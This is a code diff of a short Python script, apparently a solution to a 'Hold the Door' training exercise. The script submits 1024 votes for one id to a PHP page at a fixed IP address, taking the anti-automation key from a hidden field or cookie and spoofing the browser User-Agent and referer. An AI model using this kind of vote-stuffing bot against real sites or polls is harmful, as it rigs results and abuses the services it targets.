@@ -6,25 +6,22 @@ from bs4 import BeautifulSoup
 
 url = "http://158.69.76.135/level2.php"
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
-header = {
+h = {
     "User-Agent": user_agent,
     "referer": url
 }
-datos = {
-    "id": "4291",
-    "holdthedoor": "submit",
-    "key": ""
-}
+id = "4291"
 contador = 1024
 
-if __name__ == "__main__":
-    for i in range(0, contador):
-        session = requests.session()
-        page = session.get(url)
-        soup = BeautifulSoup(page.text, "html.parser")
+for i in range(contador):
 
-        hidden_value = soup.find("form", {"method": "post"})
-        hidden_value = hidden_value.find("input", {"type": "hidden"})
-        datos["key"] = hidden_value["value"]
+    with requests.Session() as s:
+        r = s.get(url, headers={'User-Agent': user_agent})
+        c = r.cookies
+        key_form = ""
+        for cookie in c:
+            if cookie.name == 'HoldTheDoor':
+                key_form = cookie.value
+                break
 
-        session.post(url, data=datos)
+        l = s.post(url, data={'id': id, 'holdthedoor': 'Submit', 'key': key_form}, headers=h, cookies = c)
